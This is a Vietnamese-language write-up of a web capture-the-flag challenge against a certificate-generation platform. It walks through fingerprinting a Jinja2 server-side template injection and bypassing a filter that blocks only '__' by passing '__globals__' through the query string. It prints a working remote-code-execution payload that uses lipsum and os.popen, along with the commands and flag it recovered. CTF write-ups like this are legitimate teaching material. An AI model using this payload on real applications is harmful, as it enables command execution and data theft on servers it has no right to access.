# Merged — Web (Medium)

**Flag:** `WEBVERSE{8ba2f569dafeedea7f4f6848757e1917}`

## Đề bài

Hệ thống mục tiêu là Certmarq, một nền tảng dịch vụ cấp phát chứng chỉ khóa học. Quy trình của nó: nhà phát hành chỉ việc thiết kế mẫu vỏn vẹn một lần, nền tảng sẽ tự động trích xuất và nhồi (merge) thông tin của từng học viên vào mẫu đó, rồi phun ra chứng chỉ hàng loạt. 
Chỗ hiểm yếu của đề bài nằm ở tính năng: trình thiết kế (designer) cho phép nhà phát hành xem trước (preview) bản chứng chỉ bằng cách kết xuất (render) trực tiếp trên máy chủ. Lời nhận xét "nó quá dễ dãi tin tưởng vào người thiết kế hơn mức cho phép" chính là tiếng chuông báo tử cho máy chủ này.

## Phân tích ban đầu

Người chơi có thể lách vào tạo tài khoản nhà phát hành (issuer) một cách nhẹ nhàng mà không bị hệ thống đòi hỏi xác thực email, đâm thẳng vào màn hình chức năng `/designer`. Trên giao diện, hệ thống cảnh cáo: 
*"mọi bản mẫu (template) đều phải chui qua máy quét kiểm duyệt nội dung (content filter) trước khi được kết xuất"* - Đoạn này như một lời thách thức, nói huỵch toẹt ra là tác giả biết thừa lỗ hổng SSTI (Server-Side Template Injection) đang tồn tại và đã cắm bộ lọc để ngăn chặn nó.

Điểm nhận chìm (sink) của dữ liệu nằm ở cổng `POST /designer/preview`, chỉ ngốn duy nhất một trường dữ liệu là `body`. Dùng các loại đạn thăm dò (fingerprint) bắn phá hệ thống để nhận diện động cơ:

| Đạn thăm dò (Probe) | Phản hồi |
| --- | --- |
| `{{7*7}}` | Đẻ ra `49` |
| `{{7*'7'}}` | Đẻ ra `7777777` -> Đích thị là động cơ Jinja2 (Nếu là Twig thì nó sẽ nhả `77`). |
| `${7*7}` | Giữ nguyên văn -> Loại trừ nhánh Twig/EJS. |
| `{{ ''\|class }}` | Dội mã lỗi `TemplateAssertionError` -> 100% cú pháp bộ lọc của Jinja. |
| `{{config.items()}}` | Phun sạch sẽ toàn bộ mảng cấu hình config của thư viện Flask. |
| `{{ ''.__class__ }}` | Chặn đứng với thông báo: *the pattern "__" is not allowed* |

Đánh giá tài sản thu hoạch được: Lỗ hổng chết người của cái bộ lọc ngớ ngẩn này là nó chỉ săm soi chăm chăm vào duy nhất một chuỗi văn bản là `__` (hai dấu gạch dưới - dunder). Mọi chuỗi rác (literal) chứa cụm dunder nhét trong template đều bị chém đứt, nhưng mắt nó lại hoàn toàn mù loà, không hề nhìn vào phần biến số truyền tải qua đuôi url (query string).

## Chuỗi khai thác

Ý đồ tác chiến: Thiết kế một khối template trong sạch tì vết, cấm tuyệt đối mọi dấu vết của cụm `__`. Bù lại, cái tên thật sự của cụm dunder cần tìm sẽ được ta phù phép, nhập lậu từ bên ngoài thông qua ngõ cửa sau là biến `request.args`:

```jinja
{{(lipsum|attr(request.args.g))['os'].popen(request.args.c).read()}}
```

Giải phẫu cú pháp:
- Biến `lipsum` là một khối dữ liệu toàn cục (global) được nhúng sẵn mặc định bên trong lòng Jinja2. Bằng cách gọi `attr(request.args.g)` kèm mồi `g=__globals__` vứt trên thanh query, ta đã thành công thò tay bốc trọn bộ từ điển biến toàn cục của module hệ thống `jinja2.utils`. Và trong mớ hỗn độn đó, bộ thư viện quyền lực `os` vốn đã được nạp (import) sẵn để đợi ta xài.
- Dòng lệnh `['os'].popen(request.args.c).read()` có chức năng mượn danh nghĩa OS để kích nổ luồng lệnh hệ thống (thông qua biến `c`), và hốt trọn toàn bộ kết quả ném thẳng lên màn hình giao diện xem trước (preview).
- Khối thân (body) của mã template đem gửi không hề tàng trữ cụm mã cấm `__`, giúp nó qua mặt bộ lọc kiểm duyệt một cách kiêu hãnh. Cụm từ nhạy cảm `__globals__` được nhét an toàn ở thanh URL (query string), nằm ngoài tầm quét radar của bộ lọc.

Bài kiểm tra nhân phẩm bằng lệnh `c=id`: Trả về `uid=33(www-data)`. Sau khi đã êm xuôi, thay đạn `c=cat /flag.txt` để cuỗm cờ. 
Nếu mổ xẻ file `/entrypoint.sh` đính kèm, chính miệng tác giả cũng đã thừa nhận: *"Direct, unsandboxed Jinja2 SSTI ... a standard Jinja2 RCE chain reads /flag.txt"* (Lỗ hổng SSTI trực diện không bọc cát... một chuỗi RCE mẫu mực của Jinja2 đã moi được file /flag.txt).

Khối payload thần thánh trọn vẹn và cách bọc nó bằng mã Javascript `fetch()` được cất giữ kỹ trong tệp `analysis/payload.md`.

## Flag
```text
WEBVERSE{8ba2f569dafeedea7f4f6848757e1917}
```

Lời dặn dò: Bạn không thể tìm thấy file `exploit.py` nào để chạy lại thao tác này. Đoạn mã script dùng thư viện `requests` từng được cày cuốc viết ra, nhưng đáng tiếc chưa từng trải qua một lần kích hoạt thành công: Khi người thử nghiệm chạy lại, môi trường (instance) đã bị máy chủ dập tắt (Nền tảng WebVerse có luật thép chỉ cho chạy duy nhất một môi trường tại một thời điểm), và định danh gốc của các trường thông tin trong form đăng ký vẫn chưa kịp được ghi chép xác nhận. 
Sản phẩm cuối cùng được bảo chứng chính là đoạn chuỗi payload kèm theo khối mã nhúng JS nằm trong tệp `analysis/payload.md`. Mã này được thiết kế để nã trực tiếp trên giao diện console của cái tab chứa chính instance đó.
